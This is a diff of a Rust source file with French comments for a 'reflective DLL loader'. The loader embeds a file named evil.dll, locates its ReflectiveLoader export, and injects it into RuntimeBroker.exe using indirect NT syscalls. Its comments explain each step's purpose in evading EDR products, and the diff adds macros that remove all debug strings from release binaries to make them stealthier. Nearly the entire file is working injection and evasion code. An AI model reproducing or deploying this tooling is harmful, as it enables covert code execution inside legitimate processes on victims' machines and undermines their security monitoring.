@@ -28,6 +28,28 @@
 */
 
 // ============================================================
+// MACROS DEBUG - Supprimées en release pour éviter les strings
+// ============================================================
+// Ces macros remplacent debug_println!/debug_eprintln! et sont complètement
+// éliminées par le compilateur en mode release (cargo build --release)
+// En debug : affiche le message normalement
+// En release : ne génère aucun code, aucune string dans le binaire
+
+macro_rules! debug_println {
+    ($($arg:tt)*) => {
+        #[cfg(debug_assertions)]
+        println!($($arg)*);
+    };
+}
+
+macro_rules! debug_eprintln {
+    ($($arg:tt)*) => {
+        #[cfg(debug_assertions)]
+        eprintln!($($arg)*);
+    };
+}
+
+// ============================================================
 // IMPORTS
 // ============================================================
 
@@ -35,13 +57,13 @@
 // Voir syscalls/ pour l'implémentation (utilise rust_syscalls)
 mod syscalls;
 
-use std::mem::zeroed;   // Pour initialiser des structures à zéro
-use std::ptr::null_mut; // Pointeur null pour les APIs Windows
-use libc::c_void;       // Type void* pour la FFI
+use libc::c_void;
+use std::mem::zeroed; // Pour initialiser des structures à zéro
+use std::ptr::null_mut; // Pointeur null pour les APIs Windows // Type void* pour la FFI
 
 // Types NT (Native API) - structures Windows non documentées
-use ntapi::ntapi_base::CLIENT_ID;  // Structure identifiant un thread/process
-use ntapi::ntexapi::{PSYSTEM_PROCESS_INFORMATION, SystemProcessInformation}; // Pour énumération
+use ntapi::ntapi_base::CLIENT_ID; // Structure identifiant un thread/process
+use ntapi::ntexapi::{SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION}; // Pour énumération
 use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES}; // Types de base Windows
 use winapi::shared::ntstatus::STATUS_SUCCESS; // Code de succès 0x00000000
 
@@ -50,7 +72,7 @@ use winapi::shared::ntstatus::STATUS_SUCCESS; // Code de succès 0x00000000
 // ============================================================
 // Ces constantes sont utilisées avec NtAllocateVirtualMemory et NtProtectVirtualMemory
 
-const PAGE_READWRITE: u32 = 0x04;    // RW - Mémoire lisible et inscriptible
+const PAGE_READWRITE: u32 = 0x04; // RW - Mémoire lisible et inscriptible
 const PAGE_EXECUTE_READ: u32 = 0x20; // RX - Mémoire exécutable et lisible (pas RWX!)
 const MEM_COMMIT_RESERVE: u32 = 0x3000; // MEM_COMMIT | MEM_RESERVE - Alloue et réserve
 
@@ -61,8 +83,8 @@ const MEM_COMMIT_RESERVE: u32 = 0x3000; // MEM_COMMIT | MEM_RESERVE - Alloue et 
 // on demande seulement les droits strictement nécessaires :
 
 const PROCESS_CREATE_THREAD: u32 = 0x0002; // Droit de créer des threads
-const PROCESS_VM_OPERATION: u32 = 0x0008;  // Droit de modifier la mémoire virtuelle
-const PROCESS_VM_WRITE: u32 = 0x0020;      // Droit d'écrire dans la mémoire
+const PROCESS_VM_OPERATION: u32 = 0x0008; // Droit de modifier la mémoire virtuelle
+const PROCESS_VM_WRITE: u32 = 0x0020; // Droit d'écrire dans la mémoire
 
 // Combinaison minimale : 0x0002 | 0x0008 | 0x0020 = 0x002A
 // Beaucoup moins suspect que PROCESS_ALL_ACCESS pour les EDR
@@ -89,64 +111,64 @@ const DLL_BYTES: &[u8] = include_bytes!("../../reflective_dll/evil.dll");
 // DOS Header - Premier header d'un fichier PE (héritage MS-DOS)
 #[repr(C)]
 struct DosHeader {
-    e_magic: u16,         // Magic number "MZ" (0x5A4D)
-    _padding: [u8; 58],   // Champs DOS qu'on ignore
-    e_lfanew: u32,        // Offset vers le NT Header (PE signature)
+    e_magic: u16,       // Magic number "MZ" (0x5A4D)
+    _padding: [u8; 58], // Champs DOS qu'on ignore
+    e_lfanew: u32,      // Offset vers le NT Header (PE signature)
 }
 
 // NT Headers - Header principal PE (après DOS header)
 #[repr(C)]
 struct NtHeaders64 {
-    signature: u32,                   // PE signature "PE\0\0" (0x4550)
-    file_header: FileHeader,          // Informations générales du fichier
+    signature: u32,                    // PE signature "PE\0\0" (0x4550)
+    file_header: FileHeader,           // Informations générales du fichier
     optional_header: OptionalHeader64, // Header "optionnel" (mais toujours présent)
 }
 
 // File Header - Informations générales sur le fichier PE
 #[repr(C)]
 struct FileHeader {
-    machine: u16,                   // Architecture (0x8664 = x64)
-    number_of_sections: u16,        // Nombre de sections (.text, .data, etc.)
-    time_date_stamp: u32,           // Timestamp de compilation
-    pointer_to_symbol_table: u32,   // Pour le debugging (souvent 0)
-    number_of_symbols: u32,         // Pour le debugging (souvent 0)
-    size_of_optional_header: u16,   // Taille de l'OptionalHeader
-    characteristics: u16,           // Flags (exe vs dll, etc.)
+    machine: u16,                 // Architecture (0x8664 = x64)
+    number_of_sections: u16,      // Nombre de sections (.text, .data, etc.)
+    time_date_stamp: u32,         // Timestamp de compilation
+    pointer_to_symbol_table: u32, // Pour le debugging (souvent 0)
+    number_of_symbols: u32,       // Pour le debugging (souvent 0)
+    size_of_optional_header: u16, // Taille de l'OptionalHeader
+    characteristics: u16,         // Flags (exe vs dll, etc.)
 }
 
 // Optional Header - Contient des métadonnées sur l'image PE (DLL/EXE)
 // Appelé "optionnel" mais toujours présent dans les PE modernes
 #[repr(C)]
 struct OptionalHeader64 {
-    magic: u16,                     // 0x20B pour PE64
-    major_linker_version: u8,       // Version du linker
+    magic: u16,               // 0x20B pour PE64
+    major_linker_version: u8, // Version du linker
     minor_linker_version: u8,
-    size_of_code: u32,              // Taille totale du code
-    size_of_initialized_data: u32,  // Taille des données initialisées
-    size_of_uninitialized_data: u32,// Taille des données non-init (.bss)
-    address_of_entry_point: u32,    // RVA du point d'entrée (DllMain pour DLL)
-    base_of_code: u32,              // RVA de la section code (.text)
-    image_base: u64,                // Adresse de base préférée (ex: 0x140000000)
-    section_alignment: u32,         // Alignement en mémoire (ex: 0x1000 = 4KB)
-    file_alignment: u32,            // Alignement sur disque (ex: 0x200 = 512 bytes)
-    major_os_version: u16,          // Version OS minimale
+    size_of_code: u32,               // Taille totale du code
+    size_of_initialized_data: u32,   // Taille des données initialisées
+    size_of_uninitialized_data: u32, // Taille des données non-init (.bss)
+    address_of_entry_point: u32,     // RVA du point d'entrée (DllMain pour DLL)
+    base_of_code: u32,               // RVA de la section code (.text)
+    image_base: u64,                 // Adresse de base préférée (ex: 0x140000000)
+    section_alignment: u32,          // Alignement en mémoire (ex: 0x1000 = 4KB)
+    file_alignment: u32,             // Alignement sur disque (ex: 0x200 = 512 bytes)
+    major_os_version: u16,           // Version OS minimale
     minor_os_version: u16,
-    major_image_version: u16,       // Version de l'image
+    major_image_version: u16, // Version de l'image
     minor_image_version: u16,
-    major_subsystem_version: u16,   // Version subsystem (ex: Win10 = 10.0)
+    major_subsystem_version: u16, // Version subsystem (ex: Win10 = 10.0)
     minor_subsystem_version: u16,
-    win32_version_value: u32,       // Réservé (toujours 0)
-    size_of_image: u32,             // Taille totale de l'image en mémoire
-    size_of_headers: u32,           // Taille totale des headers
-    checksum: u32,                  // Checksum PE (souvent 0 sauf drivers)
-    subsystem: u16,                 // Type (GUI=2, CUI=3, DLL=1)
-    dll_characteristics: u16,       // Flags (ASLR, DEP, etc.)
-    size_of_stack_reserve: u64,     // Taille réservée pour la stack
-    size_of_stack_commit: u64,      // Taille commitée pour la stack
-    size_of_heap_reserve: u64,      // Taille réservée pour le heap
-    size_of_heap_commit: u64,       // Taille commitée pour le heap
-    loader_flags: u32,              // Obsolète
-    number_of_rva_and_sizes: u32,   // Nombre de DataDirectories (16 standard)
+    win32_version_value: u32,              // Réservé (toujours 0)
+    size_of_image: u32,                    // Taille totale de l'image en mémoire
+    size_of_headers: u32,                  // Taille totale des headers
+    checksum: u32,                         // Checksum PE (souvent 0 sauf drivers)
+    subsystem: u16,                        // Type (GUI=2, CUI=3, DLL=1)
+    dll_characteristics: u16,              // Flags (ASLR, DEP, etc.)
+    size_of_stack_reserve: u64,            // Taille réservée pour la stack
+    size_of_stack_commit: u64,             // Taille commitée pour la stack
+    size_of_heap_reserve: u64,             // Taille réservée pour le heap
+    size_of_heap_commit: u64,              // Taille commitée pour le heap
+    loader_flags: u32,                     // Obsolète
+    number_of_rva_and_sizes: u32,          // Nombre de DataDirectories (16 standard)
     data_directories: [DataDirectory; 16], // Table des répertoires de données
 }
 
@@ -156,40 +178,40 @@ struct OptionalHeader64 {
 #[repr(C)]
 #[derive(Copy, Clone)]
 struct DataDirectory {
-    virtual_address: u32,  // RVA de la structure
-    size: u32,             // Taille de la structure
+    virtual_address: u32, // RVA de la structure
+    size: u32,            // Taille de la structure
 }
 
 // Section Header - Décrit une section du PE (.text, .data, .rdata, etc.)
 #[repr(C)]
 struct SectionHeader {
-    name: [u8; 8],              // Nom de la section (ex: ".text\0\0\0")
-    virtual_size: u32,          // Taille en mémoire
-    virtual_address: u32,       // RVA de la section quand mappée
-    size_of_raw_data: u32,      // Taille dans le fichier (peut être != virtual_size)
-    pointer_to_raw_data: u32,   // Offset dans le fichier (file offset)
-    pointer_to_relocations: u32,// Pour les fichiers .obj (0 dans PE final)
-    pointer_to_linenumbers: u32,// Pour le debug (0 si strippé)
-    number_of_relocations: u16, // Nombre de relocations
-    number_of_linenumbers: u16, // Nombre de lignes debug
-    characteristics: u32,       // Flags (executable, readable, writable, etc.)
+    name: [u8; 8],               // Nom de la section (ex: ".text\0\0\0")
+    virtual_size: u32,           // Taille en mémoire
+    virtual_address: u32,        // RVA de la section quand mappée
+    size_of_raw_data: u32,       // Taille dans le fichier (peut être != virtual_size)
+    pointer_to_raw_data: u32,    // Offset dans le fichier (file offset)
+    pointer_to_relocations: u32, // Pour les fichiers .obj (0 dans PE final)
+    pointer_to_linenumbers: u32, // Pour le debug (0 si strippé)
+    number_of_relocations: u16,  // Nombre de relocations
+    number_of_linenumbers: u16,  // Nombre de lignes debug
+    characteristics: u32,        // Flags (executable, readable, writable, etc.)
 }
 
 // Export Directory - Table des exports d'une DLL
 // Contient les noms de toutes les fonctions exportées et leurs adresses
 #[repr(C)]
 struct ExportDirectory {
-    characteristics: u32,           // Réservé (0)
-    time_date_stamp: u32,           // Timestamp de création
-    major_version: u16,             // Version
+    characteristics: u32, // Réservé (0)
+    time_date_stamp: u32, // Timestamp de création
+    major_version: u16,   // Version
     minor_version: u16,
-    name: u32,                      // RVA du nom de la DLL
-    base: u32,                      // Ordinal de base (souvent 1)
-    number_of_functions: u32,       // Nombre total de fonctions exportées
-    number_of_names: u32,           // Nombre de fonctions avec nom
-    address_of_functions: u32,      // RVA du tableau des adresses de fonctions
-    address_of_names: u32,          // RVA du tableau des noms (pointeurs vers strings)
-    address_of_name_ordinals: u32,  // RVA du tableau des ordinals
+    name: u32,                     // RVA du nom de la DLL
+    base: u32,                     // Ordinal de base (souvent 1)
+    number_of_functions: u32,      // Nombre total de fonctions exportées
+    number_of_names: u32,          // Nombre de fonctions avec nom
+    address_of_functions: u32,     // RVA du tableau des adresses de fonctions
+    address_of_names: u32,         // RVA du tableau des noms (pointeurs vers strings)
+    address_of_name_ordinals: u32, // RVA du tableau des ordinals
 }
 
 // ============================================================
@@ -211,7 +233,7 @@ struct ExportDirectory {
 fn rva_to_offset(rva: u32, sections: &[SectionHeader]) -> Option<u32> {
     // Parcourt chaque section pour trouver celle qui contient le RVA
     for section in sections {
-        let section_start = section.virtual_address;        // Début de la section en mémoire
+        let section_start = section.virtual_address; // Début de la section en mémoire
         let section_end = section_start + section.virtual_size; // Fin de la section
 
         // Vérifie si le RVA est dans cette section
@@ -243,7 +265,7 @@ fn rva_to_offset(rva: u32, sections: &[SectionHeader]) -> Option<u32> {
 // pas l'alignement des données avec MinGW cross-compilation
 fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
     unsafe {
-        println!("[DEBUG] DLL size: {} bytes", dll_bytes.len());
+        debug_println!("[DEBUG] DLL size: {} bytes", dll_bytes.len());
 
         // ============================================================
         // ÉTAPE 1: Lire le DOS Header
@@ -258,7 +280,7 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
             return Err("Invalid DOS header".to_string());
         }
 
-        println!(
+        debug_println!(
             "[DEBUG] DOS header OK, e_lfanew: 0x{:X}",
             dos_header.e_lfanew
         );
@@ -268,7 +290,7 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
         // ============================================================
         // e_lfanew contient l'offset vers le NT Header (PE signature)
         let nt_headers = std::ptr::read_unaligned(
-            dll_bytes.as_ptr().add(dos_header.e_lfanew as usize) as *const NtHeaders64
+            dll_bytes.as_ptr().add(dos_header.e_lfanew as usize) as *const NtHeaders64,
         );
 
         // Vérifier le PE signature "PE\0\0" (0x4550)
@@ -276,8 +298,8 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
             return Err("Invalid PE signature".to_string());
         }
 
-        println!("[DEBUG] PE signature OK");
-        println!(
+        debug_println!("[DEBUG] PE signature OK");
+        debug_println!(
             "[DEBUG] Number of sections: {}",
             nt_headers.file_header.number_of_sections
         );
@@ -298,8 +320,10 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
         let mut sections = Vec::with_capacity(num_sections);
         for i in 0..num_sections {
             let section = std::ptr::read_unaligned(
-                dll_bytes.as_ptr().add(sections_offset + i * std::mem::size_of::<SectionHeader>())
-                    as *const SectionHeader
+                dll_bytes
+                    .as_ptr()
+                    .add(sections_offset + i * std::mem::size_of::<SectionHeader>())
+                    as *const SectionHeader,
             );
             sections.push(section);
         }
@@ -316,20 +340,20 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
             return Err("No export directory".to_string());
         }
 
-        println!("[DEBUG] Export dir RVA: 0x{:X}", export_dir_rva);
+        debug_println!("[DEBUG] Export dir RVA: 0x{:X}", export_dir_rva);
 
         // Convertir le RVA en file offset pour pouvoir le lire
         let export_dir_offset =
             rva_to_offset(export_dir_rva, &sections).ok_or("Failed to convert export dir RVA")?;
 
-        println!("[DEBUG] Export dir offset: 0x{:X}", export_dir_offset);
+        debug_println!("[DEBUG] Export dir offset: 0x{:X}", export_dir_offset);
 
         // Lire l'Export Directory avec read_unaligned
         let export_dir = std::ptr::read_unaligned(
-            dll_bytes.as_ptr().add(export_dir_offset as usize) as *const ExportDirectory
+            dll_bytes.as_ptr().add(export_dir_offset as usize) as *const ExportDirectory,
         );
 
-        println!("[DEBUG] Number of names: {}", export_dir.number_of_names);
+        debug_println!("[DEBUG] Number of names: {}", export_dir.number_of_names);
 
         // ============================================================
         // ÉTAPE 5: Convertir les RVA des tables d'export en file offsets
@@ -377,7 +401,7 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
 
             // Comparer avec "ReflectiveLoader"
             if name == "ReflectiveLoader" {
-                println!("[DEBUG] Found ReflectiveLoader at index {}", i);
+                debug_println!("[DEBUG] Found ReflectiveLoader at index {}", i);
 
                 // ============================================================
                 // ÉTAPE 7: Trouver l'adresse de ReflectiveLoader
@@ -399,7 +423,7 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
                     as *const u32;
                 let func_rva = std::ptr::read_unaligned(func_rva_ptr);
 
-                println!("[DEBUG] Function RVA: 0x{:X}", func_rva);
+                debug_println!("[DEBUG] Function RVA: 0x{:X}", func_rva);
 
                 // ============================================================
                 // ÉTAPE 8: Convertir le RVA en file offset (CRUCIAL!)
@@ -409,7 +433,7 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
                 let func_offset = rva_to_offset(func_rva, &sections)
                     .ok_or("Failed to convert function RVA to file offset")?;
 
-                println!("[DEBUG] Function file offset: 0x{:X}", func_offset);
+                debug_println!("[DEBUG] Function file offset: 0x{:X}", func_offset);
 
                 // Retourner l'offset fichier de ReflectiveLoader
                 return Ok(func_offset);
@@ -446,14 +470,14 @@ fn find_process_pid(target_name: &str) -> Option<u32> {
         // SystemProcessInformation (5) = récupère infos sur tous les processus
         let status: i32 = syscall!(
             "NtQuerySystemInformation",
-            SystemProcessInformation as u32,  // Information class = 5
+            SystemProcessInformation,           // Information class = 5
             buffer.as_mut_ptr() as *mut c_void, // Buffer pour recevoir les données
-            buffer_size,                       // Taille du buffer
-            &mut return_length as *mut u32     // Taille réelle utilisée
+            buffer_size,                        // Taille du buffer
+            &mut return_length as *mut u32      // Taille réelle utilisée
         );
 
         if status != 0 {
-            eprintln!("[✗] NtQuerySystemInformation failed: {:#X}", status);
+            debug_eprintln!("[✗] NtQuerySystemInformation failed: {:#X}", status);
             return None;
         }
 
@@ -526,9 +550,9 @@ fn inject_reflective_dll(
     dll_bytes: &[u8],
     loader_offset: u32,
 ) -> Result<(), String> {
-    println!("[*] Target PID: {}", target_pid);
-    println!("[*] DLL size: {} bytes", dll_bytes.len());
-    println!("[*] ReflectiveLoader offset: 0x{:X}", loader_offset);
+    debug_println!("[*] Target PID: {}", target_pid);
+    debug_println!("[*] DLL size: {} bytes", dll_bytes.len());
+    debug_println!("[*] ReflectiveLoader offset: 0x{:X}", loader_offset);
 
     unsafe {
         // =====================================================
@@ -537,11 +561,11 @@ fn inject_reflective_dll(
         // Ouvre le processus cible pour obtenir un HANDLE
         // On utilise MINIMUM_ACCESS (0x002A) au lieu de PROCESS_ALL_ACCESS
         // pour être moins suspect aux yeux des EDR
-        println!(
+        debug_println!(
             "\n[STEP 1] NtOpenProcess (minimum rights: 0x{:04X})",
             MINIMUM_ACCESS
         );
-        println!("────────────────────────────────────────────");
+        debug_println!("────────────────────────────────────────────");
 
         let mut h_process: HANDLE = null_mut();
 
@@ -553,7 +577,7 @@ fn inject_reflective_dll(
         // CLIENT_ID - identifie le processus cible par son PID
         let mut client_id = CLIENT_ID {
             UniqueProcess: target_pid as HANDLE, // PID du processus cible
-            UniqueThread: null_mut(),             // null car on ouvre un process, pas un thread
+            UniqueThread: null_mut(),            // null car on ouvre un process, pas un thread
         };
 
         // Appel du syscall indirect NtOpenProcess
@@ -575,7 +599,7 @@ fn inject_reflective_dll(
             return Err(format!("NtOpenProcess failed: {:#X}", status));
         }
 
-        println!("[+] Process handle: {:p}", h_process);
+        debug_println!("[+] Process handle: {:p}", h_process);
 
         // =====================================================
         // ÉTAPE 2: NtAllocateVirtualMemory (remote, RW)
@@ -583,11 +607,11 @@ fn inject_reflective_dll(
         // Alloue de la mémoire dans le processus distant
         // On alloue en RW (Read-Write) d'abord, on changera en RX après
         // Pourquoi pas RWX directement ? Car RWX est très suspect pour les EDR
-        println!("\n[STEP 2] NtAllocateVirtualMemory (remote, RW)");
-        println!("────────────────────────────────────────────");
+        debug_println!("\n[STEP 2] NtAllocateVirtualMemory (remote, RW)");
+        debug_println!("────────────────────────────────────────────");
 
         let mut base_address: *mut c_void = null_mut(); // Adresse allouée (out)
-        let mut region_size: usize = dll_bytes.len();   // Taille à allouer
+        let mut region_size: usize = dll_bytes.len(); // Taille à allouer
 
         // Appel du syscall indirect NtAllocateVirtualMemory
         // Paramètres:
@@ -601,7 +625,7 @@ fn inject_reflective_dll(
             "NtAllocateVirtualMemory",
             h_process,
             &mut base_address as *mut _ as *mut _,
-            0usize,                            // ZeroBits
+            0usize, // ZeroBits
             &mut region_size as *mut usize,
             MEM_COMMIT_RESERVE,
             PAGE_READWRITE
@@ -612,7 +636,7 @@ fn inject_reflective_dll(
             return Err(format!("NtAllocateVirtualMemory failed: {:#X}", status));
         }
 
-        println!("[+] Remote memory at: {:p}", base_address);
+        debug_println!("[+] Remote memory at: {:p}", base_address);
 
         // =====================================================
         // ÉTAPE 3: NtWriteVirtualMemory (copie la DLL entière)
@@ -620,8 +644,8 @@ fn inject_reflective_dll(
         // Copie la DLL brute (fichier) dans la mémoire distante
         // IMPORTANT: On copie la DLL ENTIÈRE, pas seulement le code
         // ReflectiveLoader aura besoin des headers PE pour se mapper correctement
-        println!("\n[STEP 3] NtWriteVirtualMemory (copy entire DLL)");
-        println!("────────────────────────────────────────────");
+        debug_println!("\n[STEP 3] NtWriteVirtualMemory (copy entire DLL)");
+        debug_println!("────────────────────────────────────────────");
 
         let mut bytes_written: usize = 0;
 
@@ -646,13 +670,13 @@ fn inject_reflective_dll(
             return Err(format!("NtWriteVirtualMemory failed: {:#X}", status));
         }
 
-        println!("[+] Written {} bytes to remote process", bytes_written);
+        debug_println!("[+] Written {} bytes to remote process", bytes_written);
 
         // =====================================================
         // ÉTAPE 4: NtProtectVirtualMemory (RW → RX)
         // =====================================================
-        println!("\n[STEP 4] NtProtectVirtualMemory (RW → RX)");
-        println!("────────────────────────────────────────────");
+        debug_println!("\n[STEP 4] NtProtectVirtualMemory (RW → RX)");
+        debug_println!("────────────────────────────────────────────");
 
         let mut old_protect: u32 = 0;
         let mut protect_addr = base_address;
@@ -672,27 +696,28 @@ fn inject_reflective_dll(
             return Err(format!("NtProtectVirtualMemory failed: {:#X}", status));
         }
 
-        println!(
+        debug_println!(
             "[+] Protection: 0x{:02X} → 0x{:02X}",
-            old_protect, PAGE_EXECUTE_READ
+            old_protect,
+            PAGE_EXECUTE_READ
         );
 
         // =====================================================
         // ÉTAPE 5: Calculer l'adresse de ReflectiveLoader
         // =====================================================
-        println!("\n[STEP 5] Calculate ReflectiveLoader address");
-        println!("────────────────────────────────────────────");
+        debug_println!("\n[STEP 5] Calculate ReflectiveLoader address");
+        debug_println!("────────────────────────────────────────────");
 
         let loader_address = (base_address as usize + loader_offset as usize) as *mut c_void;
-        println!("[+] Base address:        {:p}", base_address);
-        println!("[+] Loader offset:       0x{:X}", loader_offset);
-        println!("[+] Loader address:      {:p}", loader_address);
+        debug_println!("[+] Base address:        {:p}", base_address);
+        debug_println!("[+] Loader offset:       0x{:X}", loader_offset);
+        debug_println!("[+] Loader address:      {:p}", loader_address);
 
         // =====================================================
         // ÉTAPE 6: NtCreateThreadEx (remote thread → ReflectiveLoader)
         // =====================================================
-        println!("\n[STEP 6] NtCreateThreadEx (start ReflectiveLoader)");
-        println!("────────────────────────────────────────────");
+        debug_println!("\n[STEP 6] NtCreateThreadEx (start ReflectiveLoader)");
+        debug_println!("────────────────────────────────────────────");
 
         let mut thread_handle: *mut c_void = null_mut();
 
@@ -716,26 +741,26 @@ fn inject_reflective_dll(
             return Err(format!("NtCreateThreadEx failed: {:#X}", status));
         }
 
-        println!("[+] Remote thread created: {:p}", thread_handle);
-        println!("[+] ReflectiveLoader executing...");
+        debug_println!("[+] Remote thread created: {:p}", thread_handle);
+        debug_println!("[+] ReflectiveLoader executing...");
 
         // =====================================================
         // ÉTAPE 7: NtClose (cleanup)
         // =====================================================
-        println!("\n[STEP 7] NtClose (cleanup)");
-        println!("────────────────────────────────────────────");
+        debug_println!("\n[STEP 7] NtClose (cleanup)");
+        debug_println!("────────────────────────────────────────────");
 
         let _: NTSTATUS = syscall!("NtClose", thread_handle);
         let _: NTSTATUS = syscall!("NtClose", h_process);
 
-        println!("[+] Handles closed");
+        debug_println!("[+] Handles closed");
 
         Ok(())
     }
 }
 
 fn main() {
-    println!(
+    debug_println!(
         r#"
     ╔═══════════════════════════════════════════════════════════╗
     ║   REFLECTIVE DLL LOADER v5 - ReflectiveLdr Edition        ║
@@ -761,15 +786,15 @@ fn main() {
     // =========================================================
     // ÉTAPE 1: Parser la DLL pour trouver ReflectiveLoader
     // =========================================================
-    println!("[*] Parsing DLL to find ReflectiveLoader export...");
+    debug_println!("[*] Parsing DLL to find ReflectiveLoader export...");
 
     let loader_offset = match find_reflective_loader_offset(DLL_BYTES) {
         Ok(offset) => {
-            println!("[+] Found ReflectiveLoader at offset: 0x{:X}", offset);
+            debug_println!("[+] Found ReflectiveLoader at offset: 0x{:X}", offset);
             offset
         }
         Err(e) => {
-            eprintln!("[✗] Failed to parse DLL: {}", e);
+            debug_eprintln!("[✗] Failed to parse DLL: {}", e);
             std::process::exit(1);
         }
     };
@@ -777,31 +802,31 @@ fn main() {
     // =========================================================
     // ÉTAPE 2: Trouver RuntimeBroker.exe
     // =========================================================
-    println!("\n[*] Searching for RuntimeBroker.exe...");
+    debug_println!("\n[*] Searching for RuntimeBroker.exe...");
 
     let pid = match find_process_pid("RuntimeBroker.exe") {
         Some(pid) => pid,
         None => {
-            eprintln!("[✗] RuntimeBroker.exe not found!");
-            eprintln!("[*] Tip: Open Windows Settings to spawn RuntimeBroker.exe");
+            debug_eprintln!("[✗] RuntimeBroker.exe not found!");
+            debug_eprintln!("[*] Tip: Open Windows Settings to spawn RuntimeBroker.exe");
             std::process::exit(1);
         }
     };
 
-    println!("[+] Found RuntimeBroker.exe with PID: {}", pid);
+    debug_println!("[+] Found RuntimeBroker.exe with PID: {}", pid);
 
     // =========================================================
     // ÉTAPE 3: Injecter la DLL reflective
     // =========================================================
     match inject_reflective_dll(pid, DLL_BYTES, loader_offset) {
         Ok(_) => {
-            println!("\n════════════════════════════════════════════");
-            println!("[✓] SUCCESS: Reflective DLL injected!");
-            println!("[✓] ReflectiveLoader → DllMain → Payload executed!");
-            println!("════════════════════════════════════════════");
+            debug_println!("\n════════════════════════════════════════════");
+            debug_println!("[✓] SUCCESS: Reflective DLL injected!");
+            debug_println!("[✓] ReflectiveLoader → DllMain → Payload executed!");
+            debug_println!("════════════════════════════════════════════");
         }
         Err(e) => {
-            eprintln!("\n[✗] ERROR: {}", e);
+            debug_eprintln!("\n[✗] ERROR: {}", e);
             std::process::exit(1);
         }
     }
